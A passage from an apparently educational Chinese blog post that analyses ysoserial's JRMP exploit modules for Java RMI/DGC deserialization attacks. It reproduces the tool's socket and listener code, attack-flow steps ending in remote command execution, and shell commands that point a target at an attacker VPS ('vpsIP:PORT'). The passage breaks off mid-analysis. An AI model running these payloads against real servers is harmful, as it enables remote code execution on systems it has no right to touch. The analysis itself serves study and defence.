<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.ep.exportObject(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809230955.png"><br>这里的this.ep是TCPEndpoint对象，进入该类的exportObject方法，传入的参数依旧是Target对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809231216.png"><br>这里的this.transport是TCPTransport对象，进入该类的exportObject方法，依旧传递Target参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 使用 synchronized(this) 创建一个同步块，以确保在导出过程中的线程安全性</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// 用于启动远程通信监听器，以便可以接收客户端的远程调用请求</span></span><br><span class="line">        <span class="built_in">this</span>.listen();</span><br><span class="line">        ++<span class="built_in">this</span>.exportCount;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入TCPTransport的listen方法，这个方法用于启动远程通信监听器，以便可以接收客户端的远程调用请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 断言当前线程持有当前对象的锁</span></span><br><span class="line">    <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">// 获取目标对象的端口信息</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.getEndpoint();</span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getPort();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.server == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> + var2 + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建服务器套接字</span></span><br><span class="line">            <span class="built_in">this</span>.server = var1.newServerSocket();</span><br><span class="line">            <span class="comment">// 该线程负责执行 AcceptLoop 对象，该对象用于接受客户端的连接请求</span></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">var3</span> <span class="operator">=</span> (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(<span class="built_in">this</span>.server), <span class="string">&quot;TCP Accept-&quot;</span> + var2, <span class="literal">true</span>));</span><br><span class="line">            <span class="comment">// 启动线程 var3</span></span><br><span class="line">            var3.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BindException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + var2, var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + var2, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取系统安全管理器</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">var6</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (var6 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var6.checkListen(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码段的作用是在指定端口上监听，并创建服务器套接字进行连接请求的接受<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809231848.png"><br>观察其反序列化的过程，也能够理解Payload构造的原理</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>payloads.JRMPListener的设置和上面一样<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809205735.png"><br>exploit.JRMPClient设置<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230810220110.png"><br>服务端成功命令执行</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
<li>payloads.JRMPListener生成payload1，用于在服务器上开启一个rmi端口（这里的端也是服务端）</li>
<li>服务端接收到payload1后，进行反序列化，成功开启9999端口并监听</li>
<li>exploit.JRMPClient端生成恶意payload2，并向服务端发送</li>
<li>服务端检测到端口上有数据请求，经过解包、反序列化（rmi中的知识）后导致命令执行</li>
</ol>
<h2 id="exploit-JRMPClient分析"><a href="#exploit-JRMPClient分析" class="headerlink" title="exploit.JRMPClient分析"></a>exploit.JRMPClient分析</h2><p><strong>第一步</strong>：生成payload<br>在exploit.JRMPClient的main函数中，使用下面这句代码生成CC1链所需要的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> Utils.makePayloadObject(args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>第二步</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">makeDGCCall(hostname, port, payloadObject);</span><br></pre></td></tr></table></figure>

<p>进入该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeDGCCall</span> <span class="params">( String hostname, <span class="type">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException &#123;</span><br><span class="line">    <span class="comment">// 创建网络地址</span></span><br><span class="line">    <span class="type">InetSocketAddress</span> <span class="variable">isa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(hostname, port);</span><br><span class="line">    <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建套接字和输出流</span></span><br><span class="line">        s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">        s.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">        s.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">        dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向输出流写入一系列字节，表示调用相关的信息。这些信息包括魔数、版本、协议类型、调用类型等</span></span><br><span class="line">        dos.writeInt(TransportConstants.Magic);</span><br><span class="line">        dos.writeShort(TransportConstants.Version);</span><br><span class="line">        dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">        dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">        <span class="comment">// 创建对象输出流</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line">        <span class="comment">// 向输出流写入 DGC 相关的信息，包括 DGC 标识、脏位、对象 ID 等</span></span><br><span class="line">        objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">        objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">        objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">        objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">        objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line">        </span><br><span class="line">        objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dos != <span class="literal">null</span> ) &#123;</span><br><span class="line">            dos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法用于向指定主机和端口发送一个 DGC（分布式垃圾回收）调用<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230810105523.png"><br>观察客户端为什么需要在输出流中写入一些数字，然后再将payload写入输出流后序列化发送给服务端<br>这就需要查看服务端的代码，它对输入流是如何处理的？<br>在RMI中了解到，客户端发送的序列化数据，服务端最终会流向***Impl_Skel，这里利用的是DGC，所以查看DGCImpl_Skel的dispatch函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">            ObjID[] var7;</span><br><span class="line">            <span class="type">long</span> var8;</span><br><span class="line">            <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    VMID var39;</span><br><span class="line">                    <span class="type">boolean</span> var40;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var14.readObject();</span><br><span class="line">                        var8 = var14.readLong();</span><br><span class="line">                        var39 = (VMID)var14.readObject();</span><br><span class="line">                        var40 = var14.readBoolean();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                        <span class="comment">//...</span></span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Lease var10;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var13.readObject();</span><br><span class="line">                        var8 = var13.readLong();</span><br><span class="line">                        var10 = (Lease)var13.readObject();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                        <span class="comment">//...</span></span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        var12.writeObject(var11);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个数字和JRMPClient写入的一样，所以需要找到服务端最先处理通信传递过来的数据的地方，进入UnicastServerRef的dispatch函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">long</span> var4;</span><br><span class="line">        ObjectInput var40;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var40 = var2.getInputStream();</span><br><span class="line">            <span class="comment">// 先读取一个int，需要大于等于0</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var40.readInt();</span><br><span class="line">            <span class="keyword">if</span> (var3 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 进入这里</span></span><br><span class="line">                    <span class="built_in">this</span>.oldDispatch(var1, var2, var3);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;skeleton class not found but required for client version&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var4 = var40.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var36) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, var36);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入oldDispatch函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ObjectInput var18;</span><br><span class="line">        <span class="type">long</span> var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var18 = var2.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">var17</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.rmi.transport.DGCImpl_Skel&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (var17.isAssignableFrom(<span class="built_in">this</span>.skel.getClass())) &#123;</span><br><span class="line">                    ((MarshalInputStream)var18).useCodebaseOnly();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var13) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取一个long</span></span><br><span class="line">            var4 = var18.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, var14);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.logCall(var1, <span class="built_in">this</span>.skel.getOperations()[var3]);</span><br><span class="line">        <span class="built_in">this</span>.unmarshalCustomCallData(var18);</span><br><span class="line">        <span class="comment">// 然后在这里</span></span><br><span class="line">        <span class="built_in">this</span>.skel.dispatch(var1, var2, var3, var4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致逻辑是先读取var3，再读取var4，var3需要大于等于0，同时在DGCImpl_Skel的dispatch中，根据var3的值选择执行dirty还是clean，这里选择1，然后var4是-669196253586618813L</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/nice0e3/p/14333695.html">Java安全之ysoserial-JRMP模块分析（一） - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/2651">ysoserial JRMP相关模块分析（三）- exploit&#x2F;JRMPClient</a></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>在ysoserial项目中，exploit.JRMPListener作为恶意服务器端，等待目标连接，然后向其发送命令执行payload1<br>payloads.JRMPClient作用则是构造向JRMPListener发起远程对象请求的payload2，发送至目标漏洞服务器（这里的测试环境JRMPClient充当两个角色）<br><strong>实验环境</strong>：<br>JDK8u66<br><strong>测试</strong>：<br>exploit.JRMPListener端设置：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809162150.png"><br>payloads.JRMPClient端设置：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809162211.png"><br>运行后即可弹出计算器，导致命令执行（这里的命令执行是在JRMPClient端触发的）<br>在实际中，命令触发一般在存在漏洞的目标服务器中，因此可以使用如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="string">&#x27;touch /tmp/cve-2017-3248&#x27;</span></span><br><span class="line">java -jar ysoserial.jar JRMPClient <span class="string">&#x27;vpsIP:PORT&#x27;</span> &gt; vulrServer</span><br></pre></td></tr></table></figure>

<h2 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
<li>攻击者使用vps启用ysoserial.exploit.JRMPListener，设置需要需要执行的命令、端口和利用的模块，生成payload1</li>
<li>攻击者本地使用payloads.JRMPClient生成payload2，设置vps的ip与端口，生成payload2</li>
<li>攻击者将payload2发送至存在漏洞的目标服务器，目标服务器进行反序列化</li>
<li>目标服务器反序列化过程中会与exploit.JRMPListener进行通信（vps）</li>
<li>vps会将payload1发送至目标漏洞服务器</li>
<li>漏洞服务器会根据 exploit&#x2F;JRMPListener 设计的通信处理流程，进一步反序列化 payload1</li>
<li>在对payload1反序列化的过程中，会触发RCE</li>
</ol>
<h2 id="exploit-JRMPListener"><a href="#exploit-JRMPListener" class="headerlink" title="exploit.JRMPListener"></a>exploit.JRMPListener</h2><p>首先从其main函数开始分析，第一步是构造payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">payloadObject</span> <span class="operator">=</span> Utils.makePayloadObject(args[ <span class="number">1</span> ], args[ <span class="number">2</span> ]);</span><br></pre></td></tr></table></figure>

<p>进入该函数，关键两句代码是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">payloadObject = payload.getObject(payloadArg);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230808155640.png"><br>第二部，启动监听<br>构建了一个JRMPListener对象，查看其构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JRMPListener</span> <span class="params">(<span class="type">int</span> port, String className, URL classpathUrl)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">    <span class="built_in">this</span>.payloadObject = makeDummyObject(className);</span><br><span class="line">    <span class="built_in">this</span>.classpathUrl = classpathUrl;</span><br><span class="line">    <span class="built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="built_in">this</span>.port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中参数ss是一个ServerSocket对象</p>
<blockquote>
<p>ServerSocket对象用于创建服务器端套接字，以侦听客户端的连接请求并接受连接</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230808163423.png"><br>查看JRMPListener的run函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span> <span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 循环等待客户端连接</span></span><br><span class="line">            <span class="keyword">while</span> ( !<span class="built_in">this</span>.exit &amp;&amp; ( s = <span class="built_in">this</span>.ss.accept() ) != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                    <span class="comment">// 获取客户端的远程地址</span></span><br><span class="line">                    <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                    System.err.println(<span class="string">&quot;Have connection from &quot;</span> + remote);</span><br><span class="line">                    <span class="comment">// 获取与客户端连接的输入流</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">                    <span class="comment">// 根据标志位，选择使用原始输入流还是BufferedInputStream</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">bufIn</span> <span class="operator">=</span> is.markSupported() ? is : <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Read magic (or HTTP wrapper)</span></span><br><span class="line">                    bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                    <span class="comment">// 用于从输入流中读取数据</span></span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(bufIn);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line"></span><br><span class="line">                    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> in.readShort();</span><br><span class="line">                    <span class="comment">// 检查魔数和版本号是否匹配预期值，如果不匹配则关闭连接并继续下一次循环</span></span><br><span class="line">                    <span class="keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 获取与客户端连接的输出流</span></span><br><span class="line">                    <span class="type">OutputStream</span> <span class="variable">sockOut</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">                    <span class="type">BufferedOutputStream</span> <span class="variable">bufOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(sockOut);</span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bufOut);</span><br><span class="line">                    <span class="comment">// 从输入流中读取一个字节，表示协议类型</span></span><br><span class="line">                    <span class="type">byte</span> <span class="variable">protocol</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">switch</span> ( protocol ) &#123;</span><br><span class="line">                    <span class="comment">// 流协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.StreamProtocol:</span><br><span class="line">                        <span class="comment">// 向输出流写入一个字节作为协议确认</span></span><br><span class="line">                        out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line">                        <span class="comment">// 向输出流写入客户端主机名</span></span><br><span class="line">                        <span class="keyword">if</span> ( remote.getHostName() != <span class="literal">null</span> ) &#123;</span><br><span class="line">                            out.writeUTF(remote.getHostName());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 向输出流写入客户端的端口</span></span><br><span class="line">                        out.writeInt(remote.getPort());</span><br><span class="line">                        out.flush();</span><br><span class="line">                        in.readUTF();</span><br><span class="line">                        in.readInt();</span><br><span class="line">                    <span class="comment">// 单操作协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.SingleOpProtocol:</span><br><span class="line">                        <span class="comment">// 调用此方法处理客户端请求，这里传入了payload</span></span><br><span class="line">                        <span class="comment">// 进入的是这里</span></span><br><span class="line">                        doMessage(s, in, out, <span class="built_in">this</span>.payloadObject);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 多路复用协议</span></span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.MultiplexProtocol:</span><br><span class="line">                        System.err.println(<span class="string">&quot;Unsupported protocol&quot;</span>);</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bufOut.flush();</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( InterruptedException e ) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                    e.printStackTrace(System.err);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;Closing connection&quot;</span>);</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">                s.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">this</span>.ss != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ss.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( SocketException e ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入doMessage方法</p>
